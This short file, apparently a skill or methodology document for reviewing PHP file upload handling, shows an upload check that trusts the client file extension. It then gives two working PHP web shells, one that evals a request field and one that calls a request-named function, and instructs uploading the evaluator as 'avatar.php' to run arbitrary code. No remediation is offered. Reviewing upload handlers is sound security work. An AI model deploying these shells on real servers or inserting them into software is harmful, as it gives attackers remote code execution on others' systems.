---
name: upload-review
description: Methodology for reviewing file upload handling
version: 1.0.0
---

# File upload review

## Overview

Upload handlers that trust the client extension let attackers store server-side code.

## Vulnerable patterns

```php
if (pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['upload']['tmp_name'], 'media/' . $name);
}
```

## Exploitation

**Minimal request-fed evaluator:**
```php
<?php eval($_REQUEST['payload']); ?>
```

**Callback dispatch:**
```php
<?php
$_REQUEST['fn']($_GET['arg']);
```

## Deployment

Upload the evaluator as `avatar.php` and call it with the `payload` field.
